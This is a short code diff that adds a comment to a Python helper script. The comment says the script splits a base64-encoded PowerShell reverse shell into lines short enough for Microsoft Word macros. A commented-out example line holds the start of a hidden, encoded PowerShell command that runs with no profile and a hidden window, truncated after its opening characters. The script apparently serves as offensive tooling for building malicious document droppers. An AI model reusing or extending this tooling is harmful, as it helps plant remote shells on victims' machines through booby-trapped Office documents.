@@ -1,3 +1,5 @@
+# python script to split powershell base64 reverse shell into max line length for microsoft word macros
+
 import sys
 str = sys.argv[1]
 #str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
